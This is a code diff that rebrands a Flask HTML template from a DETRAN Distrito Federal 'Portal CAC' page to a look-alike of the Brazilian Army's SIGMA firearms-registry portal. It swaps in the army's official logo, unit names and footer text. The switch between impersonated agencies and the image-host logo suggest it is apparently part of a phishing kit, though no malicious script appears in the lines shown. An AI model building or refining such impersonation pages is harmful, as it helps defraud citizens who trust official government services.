@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal CAC - Exército Brasileiro</title>
+    <title>SIGMA - Sistema de Gerenciamento Militar de Armas</title>
 
     <!-- Preload fonts -->
     <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
@@ -44,13 +44,16 @@
     <div class="bg-white py-4">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
-                <img src="https://i.ibb.co/7RG7SfZ/MEAssinatura-1.png" alt="Logo of Secretaria de Estado de Economia" class="h-8 mb-2" />
+                <img src="https://www.eb.mil.br/image/layout_set_logo?img_id=2784964&t=1674070423784" alt="Logo do Exército Brasileiro" class="h-16 mb-2" />
                 <div>
-                    <p class="text-black text-[10px] leading-tight">
-                        SECRETARIA DE ESTADO DE ECONOMIA
+                    <p class="text-black text-sm leading-tight font-bold">
+                        EXÉRCITO BRASILEIRO
                     </p>
-                    <p id="state-text" class="text-black text-[10px] leading-tight font-bold">
-                        DETRAN - Distrito Federal
+                    <p class="text-black text-sm leading-tight">
+                        COMANDO LOGÍSTICO - COLOG
+                    </p>
+                    <p class="text-black text-sm leading-tight">
+                        DIRETORIA DE FISCALIZAÇÃO DE PRODUTOS CONTROLADOS
                     </p>
                 </div>
             </div>
@@ -67,7 +70,7 @@
                     <div class="w-1.5 h-1.5 bg-white"></div>
                 </div>
             </button>
-            <span class="text-white text-xl drop-shadow-sm">SISTEMA DE REGISTRO CAC</span>
+            <span class="text-white text-xl drop-shadow-sm">SIGMA - CONSULTA DE CADASTRO</span>
         </div>
     </div>
 
@@ -121,7 +124,8 @@
     </div>
 
     <div class="bg-custom-blue text-white text-center py-3 mt-auto">
-        <p class="text-sm">© {{ current_year }} Secretaria de Estado de Economia. Todos os direitos reservados.</p>
+        <p class="text-sm">© {{ current_year }} Exército Brasileiro - DFPC. Todos os direitos reservados.</p>
+        <p class="text-sm">SIGMA - Sistema de Gerenciamento Militar de Armas</p>
     </div>
 
     <script>
